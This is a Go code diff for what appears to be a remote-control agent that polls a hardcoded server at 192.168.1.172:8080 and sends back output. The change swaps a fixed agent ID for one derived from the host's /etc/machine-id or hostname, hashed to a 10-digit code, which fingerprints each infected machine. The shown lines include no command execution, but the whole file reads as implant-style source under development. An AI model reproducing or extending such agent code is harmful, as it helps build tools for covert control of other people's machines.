@@ -12,11 +12,13 @@ import (
 	"math/rand"
 	"time"
 	"strings"
+	"crypto/sha256"
+	"math/big"
+	"runtime"
 )
 
 const (
 	ServerURL = "http://192.168.1.172:8080" 
-	AgentID   = "test"
 	PollDelay = 2 * time.Second
 )
 
@@ -32,7 +34,39 @@ type OutputPayload struct {
 	Output string `json:"output"`
 }
 
+var AgentID string
 
+
+
+//---------
+
+//get id
+func getSystemIdentifier() string {
+
+	// Linux /etc/machine-id 
+	if data, err := os.ReadFile("/etc/machine-id"); err == nil {
+		return strings.TrimSpace(string(data))
+	}
+	if data, err := os.ReadFile("/var/lib/dbus/machine-id"); err == nil {
+		return strings.TrimSpace(string(data))
+	}
+
+	// Fallback Hostname + User
+	hostname, _ := os.Hostname()
+	return hostname + "_" + runtime.GOOS
+}
+
+//hash
+func generate10DigitCode(input string) string {
+	hash := sha256.Sum256([]byte(input))
+
+	i := new(big.Int).SetBytes(hash[:])
+
+	mod := new(big.Int).Exp(big.NewInt(10), big.NewInt(10), nil)
+	i.Mod(i, mod)
+
+	return fmt.Sprintf("%010d", i)
+}
 
 
 //---------
@@ -81,6 +115,10 @@ func sendOutput(agentID string, output string) {
 
 
 func main() {
+
+	sysIdentifier := getSystemIdentifier()
+	AgentID = generate10DigitCode(sysIdentifier)
+
 	fmt.Printf("[*] Starting agent %s...\n", AgentID)
 	fmt.Printf("[*] Polling server at %s every %v\n", ServerURL, PollDelay)
 
